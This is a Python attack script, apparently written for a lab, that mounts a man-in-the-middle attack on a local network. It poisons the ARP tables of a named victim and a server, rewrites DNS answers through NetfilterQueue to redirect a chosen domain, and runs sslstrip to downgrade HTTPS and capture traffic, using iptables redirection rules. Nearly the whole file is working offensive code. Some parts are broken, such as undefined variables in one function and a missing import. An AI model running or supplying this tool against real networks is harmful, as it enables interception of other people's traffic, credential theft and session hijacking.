from scapy.all import *

from twisted.web import http
from twisted.internet import reactor
from netfilterqueue import NetfilterQueue

from sslstrip.StrippingProxy import StrippingProxy
from sslstrip.URLMonitor import URLMonitor
from sslstrip.CookieCleaner import CookieCleaner

import logging, os
import signal
import threading
#from  multiprocessing import Process
import inspect

import sys
import getopt

stop_flag = False

def showUsage():
    print("Usage: attack <options>")
    print("Options:")
    print("-i <network>, --interface=<network>        Specify the network interface.")
    print("-v <ip>     , --ip_victim <ip>             IPv4 Address of the victim")
    print("-s <ip>     , --ip_server <ip>             IPv4 Address of the server")
    print("-d <domain> , --domain_to_spoof <domain>   Domain to spoof")
    print("-f <ip>     , --ip_to_spoof <ip>           IPv4 Address of the server to spoof")
    print("-h          , --help                       Print Usage")
    print("")	
    print("Example:"	)
    print("python attacker.py -i enp0s8 -v 10.0.2.4 -s 10.0.2.1 -d my.org -f 10.0.2.3")	
    print ("")

def parseOptions(argv):

	global input

	network_interface = None
	ip_victim = None
	ip_server = None
	domain_to_spoof = None
	ip_to_spoof = None
   
	try:
		opts, args = getopt.getopt(argv,
			"i:v:s:d:f:h",
			[
			 "interface=",
			 "ip_victim=", 
			 "ip_server=",
			 "domain_to_spoof=",
			 "ip_to_spoof=",
			 "help"

			]
			)

	except getopt.GetoptError:
		showUsage()
		sys.exit(2)


	for opt, arg in opts:
		if opt in ("-i", "--interface"):
			network_interface = arg
		if opt in ("-v", "--ip_victim"):
			ip_victim = arg
		elif opt in ("-s", "--ip_server"):
			ip_server   = arg
		elif opt in ("-d", "--domain_to_spoof"):
			domain_to_spoof   = arg
		elif opt in ("-f", "--ip_to_spoof"):
			ip_to_spoof   = arg
		elif opt in ("-h", "--help"):
			showUsage()
			sys(exit(1))

	# next two lines are needed to work for both python2 and python3 
	try:   input = raw_input
	except NameError: pass

	if network_interface == None:
		network_interface = input("enter the network interface: ")
	if ip_victim == None:
		ip_victim = input("Enter IPv4 Address of the victim: ")
	if ip_server == None:
		ip_server = input("Enter IPv4 Address of the server: ")
	if domain_to_spoof == None:
		domain_to_spoof = input("Enter domanin.spoof: ")
	if ip_to_spoof == None:
		ip_to_spoof = input("Enter IPv4 Address for the DNS spoof: ")

	return (network_interface, ip_victim, ip_server, domain_to_spoof, ip_to_spoof)

class DefaultTool:
    def __init__(
        self, ip_victim, ip_server, domain_to_spoof, network_interface, ip_to_spoof
    ):
        self.ip_victim = ip_victim
        self.ip_server = ip_server
        self.domain_to_spoof = domain_to_spoof
        self.network_interface = network_interface
        self.ip_to_spoof = ip_to_spoof

    @staticmethod
    def get_mac_from_ip(ip):
        result, _ = arping(ip)
        for _, received in result:
            return received[Ether].src

    def inspect(self,packet):
        # from payload raw packet's to scapy packet
        pkt = IP(packet.get_payload())
        # if the packet is a DNS packet
        if DNS in pkt:
            # And if the domain = domain_to_spoff and DNS is a answer packet (has a DNSRR layer)
            if domain_to_spoof.lower() in str(pkt[DNS].qd.qname) and pkt.haslayer(
                DNSRR
            ):
                # pass to the spoof function
                pkt = self.spoof(pkt)
                # put back raw version of modified packet on payload
                packet.set_payload(bytes(pkt))
        # forward
        packet.accept()

    def spoof(self,pkt):
        # change the answer section to redirect domain_to_spoff to desired address
        pkt[DNS].an = DNSRR(
            rrname=pkt[DNS].qd.qname, type="A", ttl=604800, rdata=ip_to_spoof
        )
        # set the answer count to 1
        pkt[DNS].ancount = 1
        # modifying the packet will change its checksums and lenght
        # we simply delete those field for IP and UDP
        # scapy will recalculate new proper values automaticaly when calling bytes()
        del pkt[IP].chksum
        del pkt[UDP].chksum
        del pkt[IP].len
        del pkt[UDP].len

        return pkt

    def ssl_stripping(self):
        logFile = "sslstrip.log"
        logLevel = logging.WARNING  # or WARNING
        listenPort = 8080
        spoofFavicon = False
        killSessions = True

        logging.basicConfig(
            level=logLevel,
            format="%(asctime)s %(message)s",
            filename=logFile,
            filemode="w",
        )
        URLMonitor.getInstance().setFaviconSpoofing(spoofFavicon)
        CookieCleaner.getInstance().setEnabled(killSessions)
        strippingFactory = http.HTTPFactory(timeout=10)
        strippingFactory.protocol = StrippingProxy
        reactor.listenTCP(int(listenPort), strippingFactory)
        print("sslstrip based on Moxie's Marlinspike sslstrip running...")
        reactor.run()

    def arp_poisoning_v1(self):
        while True:
            victim_mac = self.get_mac_from_ip(self.ip_victim)
            server_mac = self.get_mac_from_ip(self.ip_server)
            # getting self mac will throw exception if enp0s3 network interface does not exit
            attacker_mac = get_if_hwaddr(self.network_interface)

            victim_arp = Ether() / ARP()
            server_arp = Ether() / ARP()

            # Poison the victim's ARP table
            victim_arp[Ether].src = attacker_mac
            victim_arp[ARP].hwsrc = attacker_mac
            victim_arp[ARP].psrc = server_ip
            victim_arp[ARP].hwdst = victim_mac
            victim_arp[ARP].pdst = victim_ip
            print("poisoned victim arp table")
            sendp(victim_arp, iface=self.network_interface)

            # Poison the server's ARP table
            server_arp[Ether].src = attacker_mac
            server_arp[ARP].hwsrc = attacker_mac
            server_arp[ARP].psrc = victim_ip
            server_arp[ARP].hwdst = server_mac
            server_arp[ARP].pdst = server_ip
            print("poisoned server arp table")
            sendp(server_arp, iface=self.network_interface)

    def arp_poisoning(self):
        victim_mac = self.get_mac_from_ip(self.ip_victim)
        server_mac = self.get_mac_from_ip(self.ip_server)
        # getting self mac will throw exception if enp0s3 network interface does not exit
        attacker_mac = get_if_hwaddr(self.network_interface)

        victim_arp = Ether() / ARP()
        server_arp = Ether() / ARP()

        # Poison the victim's ARP table
        victim_arp[Ether].src = attacker_mac
        victim_arp[ARP].hwsrc = attacker_mac
        victim_arp[ARP].psrc = ip_server
        victim_arp[ARP].hwdst = victim_mac
        victim_arp[ARP].pdst = ip_victim
        
        # Poison the server's ARP table
        server_arp[Ether].src = attacker_mac
        server_arp[ARP].hwsrc = attacker_mac
        server_arp[ARP].psrc = ip_victim
        server_arp[ARP].hwdst = server_mac
        server_arp[ARP].pdst = ip_server

        print("poisoning victim arp table ...")
        print("poisoning server arp table ...")

        while not stop_flag:
            sendp([victim_arp, server_arp], iface=network_interface, loop = 0, inter = 1, verbose = 0)
            time.sleep(1)

    def attack(self):
        
        # we need an iptables FORWARD rule
        os.system("iptables -I FORWARD -j NFQUEUE --queue-num 0")

        nfqueue = NetfilterQueue()
        nfqueue.bind(0, inspect)

        try:
            print("running dns attack")
            nfqueue.run()

            print("running ssl stripping")
            self.ssl_stripping()
        
        except KeyboardInterrupt:
            # we need to clean the iptables rules else, shen done, we will stop forwarding
            os.system("iptables --flush")

    def run_attack_v1(self):
        t1 = threading.Thread(target=self.arp_poisoning)
        t1.start()
        t2 = threading.Thread(target=self.attack)
        t2.start()

        # Run the threads indefinitely
        t1.join()
        t2.join()
        print("Stopping...")
        os.system("iptables -t nat -D PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080")

    def run_attack(self):
        os.system("iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080")
        t1 = threading.Thread(target=self.arp_poisoning)
        t1.start()
        t1.join()

def signal_handler(signal, frame):
    # Set the stop flag to True when Ctrl+C is pressed
    global stop_flag
    stop_flag = True
    print("CTRL-C pressed ...")

if __name__ == "__main__":
	
    (network_interface, ip_victim, ip_server, domain_to_spoof, ip_to_spoof) = parseOptions(sys.argv[1:])
	
    print("Interface       = %s"   %(network_interface))
    print("IP of Victim    = %s"   %(ip_victim))
    print("IP of Server    = %s"   %(ip_server))
    print("Domain to spoof = %s"   %(domain_to_spoof))
    print("IP to spoof     = %s"   %(ip_to_spoof))

    tool = DefaultTool(
        ip_victim, ip_server, domain_to_spoof, network_interface, ip_to_spoof
    )

    #tool.run_attack()

    print("iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080")
    os.system("iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080")
    print("iptables -I FORWARD -j NFQUEUE --queue-num 0")
    os.system("iptables -I FORWARD -j NFQUEUE --queue-num 0")

    signal.signal(signal.SIGINT, signal_handler)

    # thread for apr spoofing
    t1 = threading.Thread(target=tool.arp_poisoning)
    t1.start()

    # thread for ssl stripping
    t2 = threading.Thread(target=tool.ssl_stripping)
    t2.start()

    # DNS spoofing
    nfqueue = NetfilterQueue()
    nfqueue.bind(0, tool.inspect)

    print("Press Ctrl-C to exit")

    print("running dns attack")
    nfqueue.run()

    while not stop_flag:
        pass
    
    # Join the threads to wait for it to finish
    reactor.stop()
    t1.join()
    t2.join()
    
    print("Restoring iptables ... ")
    print("iptables -t nat -D PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080")    
    os.system("iptables -t nat -D PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080")
    print("iptables --flush")
    os.system("iptables --flush")


